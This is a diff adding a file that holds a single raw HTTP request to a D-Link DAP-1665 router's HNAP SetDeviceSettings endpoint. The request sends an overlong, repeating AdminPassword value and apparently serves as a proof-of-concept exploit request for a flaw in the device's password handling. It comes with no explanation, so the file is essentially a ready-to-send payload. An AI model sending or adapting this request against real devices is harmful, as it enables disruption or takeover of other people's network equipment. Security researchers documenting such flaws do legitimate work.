@@ -1,0 +1,26 @@
+POST /HNAP1/ HTTP/1.1
+Host: 192.168.69.4:49156
+Content-Length: 642
+Accept: text/xml
+HNAP_AUTH: 243139B39C2724428C882FD18CDD571D 1678688840
+SOAPACTION: "http://purenetworks.com/HNAP1/SetDeviceSettings"
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.65 Safari/537.36
+Content-Type: text/xml
+Origin: http://192.168.69.4:49156
+Referer: http://192.168.69.4:49156/Admin.html
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: uid=1DxjTdrdX
+Connection: close
+
+<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+<soap:Body>
+<SetDeviceSettings xmlns="http://purenetworks.com/HNAP1/">
+<DeviceName>DAP-1665</DeviceName>
+<AdminPassword>922f7eb0967d029e689cd4a088be12306ebc7eb0637d02e9689ce5d28845ab306ebc7eb0637d02e9689ce5d28845ab306ebc7eb0637d02e9689ce5d28845ab30</AdminPassword>
+<CAPTCHA>true</CAPTCHA>
+<ChangePassword>true</ChangePassword>
+<PresentationURL>http://dlinkap.local/</PresentationURL>
+</SetDeviceSettings>
+</soap:Body>
+</soap:Envelope>
